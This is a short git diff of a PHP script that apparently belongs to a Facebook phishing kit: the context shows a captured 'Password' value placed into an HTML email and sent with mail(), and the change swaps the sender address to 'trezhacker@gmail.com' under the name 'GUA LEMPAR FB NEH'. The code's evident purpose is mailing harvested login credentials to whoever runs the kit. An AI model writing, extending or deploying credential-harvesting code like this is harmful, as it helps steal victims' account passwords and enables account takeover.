@@ -22,7 +22,7 @@ Password : <b>'.$password.'</b>
 
 $headersx  = 'MIME-Version: 1.0' . "\r\n";
 $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headersx .= 'From: GUA LEMPAR FB NEH <hasilibadah@lucknut.com>' . "\r\n";
+$headersx .= 'From: GUA LEMPAR FB NEH <trezhacker@gmail.com>' . "\r\n";
 $datamail = mail($tomail,$subject, $message, $headersx);
 ?>
 <?php
